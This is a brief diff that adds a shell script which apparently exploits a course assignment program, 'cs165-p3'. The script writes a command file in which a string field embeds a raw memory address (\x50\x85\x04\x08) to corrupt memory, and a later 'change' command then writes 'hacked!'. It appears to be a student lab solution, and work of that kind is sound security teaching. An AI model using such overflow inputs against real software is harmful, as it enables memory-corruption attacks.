@@ -1,0 +1,4 @@
+rm command-script
+echo -e "add 2 string HALO_STREAK Th\x50\x85\x04\x08irty-Nine" >> command-script
+echo -e "change 2 hacked! 39" >> command-script
+./cs165-p3 command-script output.txt
